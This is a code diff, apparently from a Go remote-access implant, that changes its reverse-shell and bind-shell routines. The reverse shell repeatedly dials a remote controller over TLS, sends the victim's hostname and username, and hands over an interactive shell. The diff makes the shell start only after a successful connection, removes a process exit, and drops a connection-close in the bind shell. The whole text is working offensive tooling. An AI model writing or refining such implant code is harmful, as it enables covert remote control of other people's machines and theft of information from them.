@@ -29,22 +29,27 @@ func InitReverseShell(connectString string, fingerprint []byte) {
 		myconn.Conn, err = tls.Dial("tcp", connectString, config)
 		if err != nil {
 			log.Printf("%s unreachable, trying agian in 5 seconds", connectString)
+		} else {
+			StartShell(&myconn.Conn)
 		}
-		StartShell(&myconn.Conn)
 		time.Sleep(5 * time.Second)
 	}
 }
 
 func StartShell(conn *myconn.Writer) {
 	sh := NewIShell(conn)
-	myconn.Send(myconn.Conn, sitrep.InitialInfo())
+
+	host, _ := sitrep.HostInfo()
+	user, _ := sitrep.UserInfo()
+
+	myconn.Send(myconn.Conn, host.Hostname)
+	myconn.Send(myconn.Conn, user.Username)
 
 	// start with an initial system shell to allow
 	// platypus to fingerprint; remove otherwise
-	sh.Process("shell")
+	// sh.Process("shell")
 
 	sh.Run()
-	os.Exit(0)
 }
 
 func NewIShell(conn *myconn.Writer) *ishell.Shell {
@@ -90,7 +95,6 @@ func BindShell() {
 			sh := NewIShell(&conn)
 
 			go func(conn myconn.Writer) {
-				defer conn.Close()
 				for {
 
 					log.Println("Accepted a request. Reading content")
